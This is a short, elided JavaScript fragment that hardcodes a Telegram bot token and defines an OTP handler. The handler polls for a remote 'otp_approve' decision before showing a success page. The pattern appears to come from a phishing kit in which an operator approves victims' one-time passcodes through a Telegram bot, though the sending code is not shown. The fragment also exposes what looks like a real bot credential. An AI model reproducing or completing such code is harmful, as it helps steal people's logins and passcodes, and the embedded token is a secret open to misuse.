const TELEGRAM_BOT_TOKEN = '8987073591:AAGVydosnAc5Cxxz-SmQV7tO0284MrW1wU4';
...
async function handleOtp() {
    ...
    startPolling((decision) => {
        if (decision === 'otp_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('success.html'); }
